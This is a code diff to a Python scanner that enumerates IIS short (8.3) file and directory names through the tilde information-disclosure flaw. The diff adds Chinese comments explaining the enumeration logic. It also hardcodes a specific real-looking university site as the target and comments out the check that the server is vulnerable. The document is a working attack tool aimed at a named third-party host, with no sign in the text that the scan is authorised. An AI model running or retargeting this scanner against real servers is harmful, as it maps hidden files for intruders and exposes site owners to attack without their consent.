@@ -97,26 +97,34 @@ class Scanner():
         while True:
             try:
                 url, ext = self.queue.get(timeout=1.0)
+                print url + '*~1' + ext + '/1.aspx'
                 status = self._get_status(url + '*~1' + ext + '/1.aspx')
                 if status == 404:
                     self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))
-
+                    # 先检测文件'~1'前的6个字符
+                    # /abcdef~1.*/1.aspx
                     if len(url) - len(self.path)< 6:    # enum first 6 chars only
                         for c in self.alphanum:
                             self.queue.put( (url + c, ext) )
                     else:
+                        # 如果字符长度为6个,说明前6个字符检测完毕
                         if ext == '.*':
+                            # 先判断是否存在此路径，将文件名后缀去掉进行检测
                             self.queue.put( (url, '') )
-
+                        # 检测到有6字符个长度的路径
                         if ext == '':
+                            # 将此路径加入结果列表
                             self.dirs.append(url + '~1')
                             self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')
 
                         elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
+                            # 如果后缀长度为4 或不为*结尾，则检测出文件名称
+                            # 超过4则不再检测
                             self.files.append(url + '~1' + ext)
                             self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')
 
                         else:
+                            # 开始检测文件的后缀
                             for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                 self.queue.put( (url, ext[:-1] + c + '*') )
                                 if len(ext) < 4:    # < len('.as*')
@@ -129,16 +137,17 @@ class Scanner():
 
 
 if __name__ == '__main__':
-    if len(sys.argv) == 1:
-        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
-        sys.exit()
-
-    target = sys.argv[1]
+    # if len(sys.argv) == 1:
+    #     print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
+    #     sys.exit()
+    #
+    # target = sys.argv[1]
+    target = 'http://bmi.ym.edu.tw/'
     s = Scanner(target)
-    if not s.is_vul():
-        s.STOP_ME = True
-        print 'Server is not vulnerable'
-        sys.exit(0)
+    # if not s.is_vul():
+    #     s.STOP_ME = True
+    #     print 'Server is not vulnerable'
+    #     sys.exit(0)
 
     print 'Server is vulnerable, please wait, scanning...'
     s.run()
